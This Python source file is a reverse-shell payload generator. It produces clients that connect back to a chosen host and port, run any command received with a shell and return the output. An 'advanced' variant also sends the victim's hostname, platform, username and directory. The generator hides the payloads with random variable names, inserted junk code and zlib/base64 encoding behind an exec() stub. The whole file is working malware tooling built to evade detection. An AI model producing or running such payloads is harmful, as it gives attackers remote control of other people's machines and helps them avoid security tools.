#!/usr/bin/env python3
"""
Working Payload Generator - Creates VALID, EXECUTABLE Python payloads
"""

import base64
import zlib
import random
import string
import hashlib
# Working payload generator

class WorkingPayloadGenerator:
    """
    Generates payloads that ACTUALLY WORK
    No broken obfuscation, valid Python syntax
    """
    
    def __init__(self):
        self.junk_functions = [
            "def {name}(): return {value}",
            "def {name}(x): return x + {value}",
            "{name} = lambda x: x * {value}",
            "class {name}: pass"
        ]
    
    def generate_payload(self, host: str, port: int, platform: str = 'all') -> str:
        """
        Generate a working reverse shell payload
        """
        
        # Base payload - simple, working reverse shell
        base_payload = f'''
import socket
import os
import sys
import time

HOST = "{host}"
PORT = {port}

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            return s
        except:
            time.sleep(10)

def main():
    s = connect()
    
    while True:
        try:
            # Receive command
            data = s.recv(1024)
            if not data:
                s.close()
                s = connect()
                continue
                
            # Decode command
            cmd = data.decode('utf-8').strip()
            
            if cmd.lower() == 'exit':
                break
                
            # Execute command
            if sys.platform == 'win32':
                import subprocess
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
            else:
                import subprocess
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
            
            # Send result
            if output:
                s.send(output.encode('utf-8'))
            else:
                s.send(b"Command executed\\n")
                
        except Exception as e:
            s.send(f"Error: {{e}}\\n".encode('utf-8'))
            
    s.close()

if __name__ == "__main__":
    try:
        main()
    except:
        pass
'''
        
        # Light obfuscation that doesn't break the code
        obfuscated = self._obfuscate_safely(base_payload)
        
        # Encode but keep it executable
        final = self._encode_payload(obfuscated)
        
        # Verify it compiles
        try:
            compile(final, '<string>', 'exec')
            return final
        except:
            # If obfuscation broke it, return simple encoded version
            return self._simple_encode(base_payload)
    
    def _obfuscate_safely(self, code: str) -> str:
        """
        Safe obfuscation that doesn't break syntax
        """
        # Variable name substitution
        var_map = {
            'HOST': self._random_var(),
            'PORT': self._random_var(),
            'connect': self._random_var(),
            'main': self._random_var()
        }
        
        result = code
        for old, new in var_map.items():
            result = result.replace(old, new)
        
        # Add some junk code that doesn't interfere
        junk = self._generate_junk()
        
        # Insert junk at the beginning (after imports)
        lines = result.split('\n')
        import_end = 0
        for i, line in enumerate(lines):
            if line.strip() and not line.startswith('import') and not line.startswith('from'):
                import_end = i
                break
        
        lines.insert(import_end, junk)
        
        return '\n'.join(lines)
    
    def _random_var(self) -> str:
        """Generate random variable name"""
        return ''.join(random.choices(string.ascii_letters, k=8))
    
    def _generate_junk(self) -> str:
        """Generate junk code that won't break execution"""
        junk_lines = []
        
        for _ in range(random.randint(3, 7)):
            template = random.choice(self.junk_functions)
            name = self._random_var()
            value = random.randint(1, 100)
            junk_lines.append(template.format(name=name, value=value))
        
        return '\n'.join(junk_lines)
    
    def _encode_payload(self, code: str) -> str:
        """
        Encode payload while keeping it executable
        """
        # Compress and encode
        compressed = zlib.compress(code.encode())
        encoded = base64.b64encode(compressed).decode()
        
        # Create decoder stub that actually works
        decoder = f'''
import base64
import zlib

payload = "{encoded}"
code = zlib.decompress(base64.b64decode(payload))
exec(code)
'''
        return decoder
    
    def _simple_encode(self, code: str) -> str:
        """
        Simple encoding fallback
        """
        encoded = base64.b64encode(code.encode()).decode()
        return f'''
import base64
exec(base64.b64decode("{encoded}"))
'''

    def generate_advanced_payload(self, host: str, port: int) -> str:
        """
        Generate more advanced payload with better features
        """
        
        advanced_payload = f'''
import socket
import os
import sys
import time
import threading
import json
import platform
import getpass

class AdvancedClient:
    def __init__(self, host="{host}", port={port}):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
        
    def connect(self):
        while not self.connected:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                self.connected = True
                self.send_info()
            except:
                time.sleep(5)
    
    def send_info(self):
        info = {{
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "user": getpass.getuser(),
            "cwd": os.getcwd()
        }}
        self.send_data(json.dumps(info))
    
    def send_data(self, data):
        try:
            if isinstance(data, str):
                data = data.encode()
            self.socket.send(data + b"\\n\\n")
        except:
            self.connected = False
            self.connect()
    
    def receive_command(self):
        try:
            data = self.socket.recv(4096)
            if data:
                return data.decode('utf-8').strip()
        except:
            self.connected = False
        return None
    
    def execute_command(self, cmd):
        try:
            if cmd.startswith('cd '):
                path = cmd[3:].strip()
                os.chdir(path)
                return f"Changed directory to {{os.getcwd()}}"
            else:
                import subprocess
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                return result.stdout + result.stderr
        except Exception as e:
            return f"Error: {{str(e)}}"
    
    def run(self):
        self.connect()
        
        while True:
            cmd = self.receive_command()
            if cmd:
                if cmd.lower() == 'exit':
                    break
                    
                output = self.execute_command(cmd)
                self.send_data(output or "Command executed")
            else:
                time.sleep(1)
        
        if self.socket:
            self.socket.close()

if __name__ == "__main__":
    client = AdvancedClient()
    try:
        client.run()
    except:
        pass
'''
        
        # Light encoding only
        return self._simple_encode(advanced_payload)


def test_generator():
    """Test the payload generator"""
    gen = WorkingPayloadGenerator()
    
    # Generate basic payload
    print("Generating basic payload...")
    payload1 = gen.generate_payload("127.0.0.1", 4444)
    
    # Test if it compiles
    try:
        compile(payload1, '<string>', 'exec')
        print(f"✅ Basic payload compiles ({len(payload1)} bytes)")
    except SyntaxError as e:
        print(f"❌ Basic payload has syntax error: {e}")
    
    # Generate advanced payload
    print("\nGenerating advanced payload...")
    payload2 = gen.generate_advanced_payload("127.0.0.1", 4444)
    
    try:
        compile(payload2, '<string>', 'exec')
        print(f"✅ Advanced payload compiles ({len(payload2)} bytes)")
    except SyntaxError as e:
        print(f"❌ Advanced payload has syntax error: {e}")
    
    # Save a test payload
    with open('/workspace/test_working_payload.py', 'w') as f:
        f.write(payload1)
    print("\nTest payload saved to test_working_payload.py")
    
    return payload1


if __name__ == "__main__":
    test_generator()